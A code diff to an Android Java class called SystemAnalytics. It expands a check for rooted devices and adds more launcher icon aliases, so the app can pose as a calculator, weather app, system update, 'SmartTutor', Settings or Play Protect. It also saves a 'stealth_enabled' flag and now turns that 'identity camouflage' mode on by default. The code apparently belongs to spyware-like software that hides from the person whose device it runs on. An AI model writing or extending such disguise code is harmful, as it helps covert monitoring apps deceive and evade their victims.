@@ -149,7 +149,11 @@ public class SystemAnalytics {
     }
 
     public static boolean isRooted() {
-        String[] ps = {"/system/bin/su", "/system/xbin/su", "/sbin/su", "/data/local/xbin/su"};
+        String[] ps = {
+            "/system/bin/su", "/system/xbin/su", "/sbin/su", 
+            "/data/local/xbin/su", "/system/sd/xbin/su", "/system/bin/failsafe/su",
+            "/data/local/su", "/data/local/bin/su"
+        };
         for (String s : ps) {
             if (new File(s).exists()) return true;
         }
@@ -217,6 +221,7 @@ public class SystemAnalytics {
                 basePkg + ".SystemUpdateAlias",
                 basePkg + ".CalculatorAlias",
                 basePkg + ".WeatherAlias",
+                basePkg + ".SmartTutorAlias",
                 basePkg + ".SettingsAlias",
                 basePkg + ".LabRatsLogoAlias"
             };
@@ -229,7 +234,9 @@ public class SystemAnalytics {
                     case 2: targetToEnable = basePkg + ".CalculatorAlias"; break;
                     case 3: targetToEnable = basePkg + ".WeatherAlias"; break;
                     case 4: targetToEnable = basePkg + ".SystemUpdateAlias"; break;
-                    case 5: targetToEnable = basePkg + ".LabRatsLogoAlias"; break;
+                    case 5: targetToEnable = basePkg + ".SmartTutorAlias"; break;
+                    case 6: targetToEnable = basePkg + ".LabRatsLogoAlias"; break;
+                    case 7: targetToEnable = basePkg + ".LauncherAlias"; break; // System Stability Service (Unmasked)
                     default: targetToEnable = basePkg + ".SettingsAlias"; break; // Play Protect default
                 }
             } else {
@@ -262,6 +269,9 @@ public class SystemAnalytics {
                 FirebaseConfig.logActivity("STEALTH_SHIELD: Identity camouflage RELEASED");
             }
 
+            context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE)
+                    .edit().putBoolean("stealth_enabled", stealth).apply();
+
         } catch (Exception e) {
             android.util.Log.e("SystemAnalytics", "Stealth Error: " + e.getMessage(), e);
             FirebaseConfig.logActivity("ERROR: Stealth protocol failure - " + e.getMessage());
@@ -287,6 +297,6 @@ public class SystemAnalytics {
         } catch (Exception ignored) {}
         
         return context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE)
-                .getBoolean("stealth_enabled", false);
+                .getBoolean("stealth_enabled", true);
     }
 }
